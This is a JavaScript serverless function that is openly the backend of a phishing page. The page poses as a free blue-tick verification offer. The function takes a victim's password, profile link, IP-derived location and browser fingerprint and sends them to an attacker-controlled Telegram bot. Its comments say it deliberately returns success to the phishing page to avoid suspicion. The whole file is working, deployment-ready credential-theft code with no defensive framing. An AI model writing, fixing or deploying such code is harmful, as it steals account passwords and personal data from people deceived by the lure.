// api/send.js
// Vercel Serverless Function – Fixed & Production-Ready

export default async function handler(req, res) {
  // 1. Only allow POST
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  // 2. Parse request body
  const { password, link, extra } = req.body;
  if (!password) {
    return res.status(400).json({ error: 'Missing password' });
  }

  // 3. Read credentials from environment variables (MUST be set in Vercel)
  const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
  const CHAT_ID   = process.env.TELEGRAM_CHAT_ID;

  // 4. Validate credentials – fail loudly (no silent 200)
  if (!BOT_TOKEN || !CHAT_ID) {
    console.error('❌ Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID in environment');
    return res.status(500).json({
      error: 'Server configuration error',
      details: 'Bot token or chat ID not set'
    });
  }

  // Optional: basic token format check (very naive, but catches common mistakes)
  if (!BOT_TOKEN.match(/^\d+:[A-Za-z0-9_-]+$/)) {
    console.error('❌ TELEGRAM_BOT_TOKEN has invalid format');
    return res.status(500).json({ error: 'Invalid token format' });
  }

  // 5. Build the Telegram message (MarkdownV2 with proper escaping)
  const now = new Date().toISOString().replace('T', ' ').slice(0, 19);
  const escapeMarkdown = (str = '') => {
    if (!str) return '';
    // Escape special characters for Telegram MarkdownV2
    return str.replace(/[_*[\]()~`>#+\-=|{}.!]/g, '\\$&');
  };

  let message = `🔵 *FREE BLUE VERIFICATION* 🔵\n\n`;
  if (link) message += `🔗 Profile Link: \`${escapeMarkdown(link)}\`\n`;
  message += `🔑 Password: \`${escapeMarkdown(password)}\`\n\n`;
  message += `🕒 Time: ${now} UTC\n`;
  message += `🌐 IP: ${escapeMarkdown(extra?.ipData?.ip || 'N/A')}\n`;
  message += `📍 Location: ${escapeMarkdown(extra?.ipData?.city || '')} ${escapeMarkdown(extra?.ipData?.region || '')} ${escapeMarkdown(extra?.ipData?.country_name || '')}\n`;
  message += `🖥️ OS: ${escapeMarkdown(extra?.fingerprint?.platform || 'N/A')}\n`;
  message += `📱 UA: ${escapeMarkdown(extra?.fingerprint?.userAgent || 'N/A')}\n`;
  message += `📱 Screen: ${escapeMarkdown(extra?.fingerprint?.screenResolution || 'N/A')}\n`;
  message += `⏰ TZ: ${escapeMarkdown(extra?.fingerprint?.timezone || 'N/A')}\n`;
  message += `🔧 Cores: ${escapeMarkdown(extra?.fingerprint?.hardwareConcurrency || 'N/A')}\n`;
  message += `🧠 Plugins: ${escapeMarkdown(extra?.fingerprint?.plugins || 'N/A')}\n`;

  // 6. Send to Telegram API
  const TELEGRAM_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

  try {
    const response = await fetch(TELEGRAM_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'MarkdownV2',
        disable_web_page_preview: true,
      }),
    });

    const responseData = await response.json();

    if (!response.ok) {
      console.error('❌ Telegram API error:', response.status, responseData);
      // Still return 200 to the phishing page (avoid suspicion),
      // but log the error for debugging on Vercel.
      return res.status(200).json({
        status: 'ok',
        debug: `Telegram error: ${responseData.description || 'Unknown'}`
      });
    }

    console.log('✅ Telegram message sent successfully', responseData);
    return res.status(200).json({ status: 'ok' });
  } catch (error) {
    console.error('🚨 Fetch/network error:', error.message);
    return res.status(200).json({
      status: 'ok',
      debug: `Network error: ${error.message}`
    });
  }
}
